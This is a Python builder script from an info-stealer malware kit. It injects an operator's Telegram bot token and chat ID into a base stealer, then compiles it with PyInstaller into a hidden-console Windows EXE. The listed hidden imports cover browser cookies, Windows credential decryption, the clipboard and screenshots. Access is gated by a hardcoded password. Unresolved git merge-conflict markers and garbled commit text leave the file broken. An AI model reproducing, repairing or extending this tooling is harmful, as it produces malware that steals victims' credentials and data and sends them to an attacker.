#!/usr/bin/env python3
import os
import sys
import json
import hashlib
import subprocess
import tempfile
import shutil
from pathlib import Path

STEALER_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(STEALER_DIR, "..", "dist")
BASE_STEALER = os.path.join(STEALER_DIR, "..", "stealer.py")
PASSWORD = "@xillenadapter"  # Пароль для доступа к билдеру V4.0

def read_stealer_base():
    try:
        with open(BASE_STEALER, "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        return None

def modify_config(code, config):
    try:
        # Заменяем токены в формате: self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN')
        code = code.replace("'YOUR_BOT_TOKEN'", f"'{config['token']}'")
        code = code.replace("'YOUR_CHAT_ID'", f"'{config['chat_id']}'")
        code = code.replace('self.SLEEP_BEFORE_START = random.randint(5, 30)', f'self.SLEEP_BEFORE_START = {config["sleep_time"]}')
        code = code.replace('self.CHUNK_SIZE = 1024 * 1024', f'self.CHUNK_SIZE = {config["chunk_size"]}')
        
        # Add Telegram language support
        telegram_lang = config.get("telegram_language", "ru")
        code = code.replace('self.TELEGRAM_LANGUAGE = "ru"', f'self.TELEGRAM_LANGUAGE = "{telegram_lang}"')
        
        modules_config = "MODULES_CONFIG = {\n"
        for key, enabled in config["modules"].items():
            modules_config += f"    '{key}': {enabled},\n"
        modules_config += "}\n"
        
        code = code.replace("class AdvancedConfig:", f"{modules_config}\nclass AdvancedConfig:")
        return code
    except Exception as e:
        raise Exception(f"Error modifying config: {str(e)}")

def save_build(name, code):
    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        output_path = os.path.join(OUTPUT_DIR, f"{name}.py")
        
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(code)
        
        return output_path
    except Exception as e:
        raise Exception(f"Error saving build: {str(e)}")

def compile_to_exe(py_path, name, icon_path=None):
    try:
<<<<<<< HEAD
        spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-
=======
        # Normalize paths for PyInstaller
        normalized_py_path = os.path.abspath(py_path).replace('\\', '/')
        normalized_dist = os.path.abspath(OUTPUT_DIR).replace('\\', '/')
        
        # Handle icon path
        icon_param = None
        if icon_path and os.path.exists(icon_path):
            # Normalize icon path for PyInstaller spec file
            normalized_icon = os.path.abspath(icon_path).replace('\\', '/')
            icon_param = f"'{normalized_icon}'"
        else:
            icon_param = 'None'
        
        spec_content = f"""# -*- mode: python ; coding: utf-8 -*-
>>>>>>> 6fd021e (Fix: РСЃРїСЂР°РІР»РµРЅР° РєРѕРјРїРёР»СЏС†РёСЏ EXE СЃ РёРєРѕРЅРєРѕР№, РґРѕР±Р°РІР»РµРЅС‹ РЅР°Р·РѕР№Р»РёРІС‹Рµ Р±Р°РЅРЅРµСЂС‹ V5.0, РёСЃРїСЂР°РІР»РµРЅ РїР°СЂРѕР»СЊ)
block_cipher = None

a = Analysis(
    [r'{py_path.replace(chr(92), chr(92)+chr(92))}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'browser_cookie3',
        'Crypto.Cipher.AES',
        'pyTelegramBotAPI',
        'psutil',
        'PIL.ImageGrab',
        'cryptography.fernet',
        'telebot',
        'requests',
        'sqlite3',
        'win32api',
        'win32con',
        'win32process',
        'win32com.client',
        'win32clipboard',
        'win32file',
        'win32crypt',
        'pywintypes'
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
<<<<<<< HEAD
    icon={repr(icon_path) if icon_path else 'None'},
    distpath={repr(OUTPUT_DIR)},
    onefile=True,
)
"""
=======
    icon={icon_param},
    distpath='{normalized_dist}',
    onefile=True,
    uac_admin=False,
)"""
>>>>>>> 6fd021e (Fix: РСЃРїСЂР°РІР»РµРЅР° РєРѕРјРїРёР»СЏС†РёСЏ EXE СЃ РёРєРѕРЅРєРѕР№, РґРѕР±Р°РІР»РµРЅС‹ РЅР°Р·РѕР№Р»РёРІС‹Рµ Р±Р°РЅРЅРµСЂС‹ V5.0, РёСЃРїСЂР°РІР»РµРЅ РїР°СЂРѕР»СЊ)
        builds_dir = os.path.join(os.path.dirname(OUTPUT_DIR), "builds")
        os.makedirs(builds_dir, exist_ok=True)
        spec_path = os.path.join(builds_dir, f"{name}.spec")
        with open(spec_path, "w", encoding="utf-8") as f:
            f.write(spec_content)
        
        # Ensure PyInstaller is installed
        try:
            import PyInstaller.__main__ as pyi_main
        except ImportError:
            return False, ["PyInstaller не установлен. Установите: pip install pyinstaller"]
        
        # Use absolute paths
        abs_spec_path = os.path.abspath(spec_path)
        abs_dist_path = os.path.abspath(OUTPUT_DIR)
        abs_build_path = os.path.abspath(os.path.join(os.path.dirname(OUTPUT_DIR), "build"))
        
        # PyInstaller command
        cmd = [
            'pyinstaller',
            abs_spec_path,
            '--distpath', abs_dist_path,
            '--workpath', abs_build_path,
            '--noconfirm',
            '--clean'
        ]
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd=os.path.dirname(OUTPUT_DIR)
        )
        
        output_lines = []
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                output_lines.append(output.strip())
        
        returncode = process.returncode
        
        # Check for EXE in dist folder (PyInstaller creates it directly there)
        dist_exe_path = os.path.join(abs_dist_path, f"{name}.exe")
        
        if returncode == 0 and os.path.exists(dist_exe_path):
            output_lines.append(f"✓ EXE успешно создан: {dist_exe_path}")
            
            # Clean up build directory and spec file
            try:
                if os.path.exists(abs_build_path):
                    shutil.rmtree(abs_build_path)
                if os.path.exists(abs_spec_path):
                    os.remove(abs_spec_path)
            except Exception as e:
                output_lines.append(f"⚠ Предупреждение при очистке: {str(e)}")
            
            return True, output_lines
        else:
            # Try to find EXE in alternative location
            alt_exe_path = os.path.join(abs_build_path, name, f"{name}.exe")
            if os.path.exists(alt_exe_path):
                try:
                    shutil.copy2(alt_exe_path, dist_exe_path)
                    output_lines.append(f"✓ EXE скопирован в: {dist_exe_path}")
                    return True, output_lines
                except Exception as e:
                    output_lines.append(f"✗ Ошибка копирования EXE: {str(e)}")
            
            error_msg = "Ошибка компиляции. Проверьте логи выше."
            if returncode != 0:
                error_msg = f"PyInstaller завершился с кодом: {returncode}"
            return False, output_lines + [f"✗ {error_msg}"]
            
    except Exception as e:
        return False, [f"Error compiling: {str(e)}"]

def get_builds_list():
    try:
        if not os.path.exists(OUTPUT_DIR):
            return []
        
        builds = []
        for file in os.listdir(OUTPUT_DIR):
            if file.endswith(('.py', '.exe')):
                file_path = os.path.join(OUTPUT_DIR, file)
                stat = os.stat(file_path)
                builds.append({
                    'name': file,
                    'size': stat.st_size,
                    'created': stat.st_ctime,
                    'type': 'exe' if file.endswith('.exe') else 'py'
                })
        
        return sorted(builds, key=lambda x: x['created'], reverse=True)
    except Exception as e:
        return []

def get_statistics():
    try:
        builds = get_builds_list()
        total_size = sum(build['size'] for build in builds)
        
        return {
            'total_builds': len(builds),
            'total_size_mb': round(total_size / (1024 * 1024), 2),
            'py_files': len([b for b in builds if b['type'] == 'py']),
            'exe_files': len([b for b in builds if b['type'] == 'exe'])
        }
    except Exception as e:
        return {'total_builds': 0, 'total_size_mb': 0, 'py_files': 0, 'exe_files': 0}

def check_password(password):
    """Проверка пароля - поддерживает прямой пароль"""
    if not password:
        return False
    
    # Убираем пробелы и нормализуем
    password = password.strip()
    
    # Прямое сравнение пароля
    if password == PASSWORD:
        return True
    
    # Также принимаем без @ символа
    if password == PASSWORD.lstrip('@'):
        return True
    
    # Сравнение без учета регистра (на всякий случай)
    if password.lower() == PASSWORD.lower():
        return True
    
    return False

def main():
    try:
        while True:
            line = sys.stdin.readline()
            if not line:
                break
            
            try:
                data = json.loads(line.strip())
                cmd = data.get('cmd')
                params = data.get('params', {})
                
                if cmd == 'check_password':
                    result = check_password(params.get('password', ''))
                    print(json.dumps({'status': 'ok', 'result': result}))
                
                elif cmd == 'build':
                    code = read_stealer_base()
                    if not code:
                        print(json.dumps({'status': 'error', 'message': 'Stealer base not found'}))
                        continue
                    
                    modified_code = modify_config(code, params)
                    output_path = save_build(params['name'], modified_code)
                    print(json.dumps({'status': 'ok', 'path': output_path}))
                
                elif cmd == 'compile':
                    py_path = params.get('path')
                    name = params.get('name')
                    icon_path = params.get('icon_path')
                    
                    if not py_path or not name:
                        print(json.dumps({'status': 'error', 'output': ['Отсутствуют обязательные параметры: path или name']}))
                        continue
                    
                    if not os.path.exists(py_path):
                        print(json.dumps({'status': 'error', 'output': [f'Файл не найден: {py_path}']}))
                        continue
                    
                    success, output = compile_to_exe(py_path, name, icon_path)
                    print(json.dumps({'status': 'ok' if success else 'error', 'output': output}))
                
                elif cmd == 'get_builds':
                    builds = get_builds_list()
                    print(json.dumps({'status': 'ok', 'builds': builds}))
                
                elif cmd == 'get_stats':
                    stats = get_statistics()
                    print(json.dumps({'status': 'ok', 'stats': stats}))
                
                else:
                    print(json.dumps({'status': 'error', 'message': 'Unknown command'}))
                    
            except json.JSONDecodeError:
                print(json.dumps({'status': 'error', 'message': 'Invalid JSON'}))
            except Exception as e:
                print(json.dumps({'status': 'error', 'message': str(e)}))
                
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
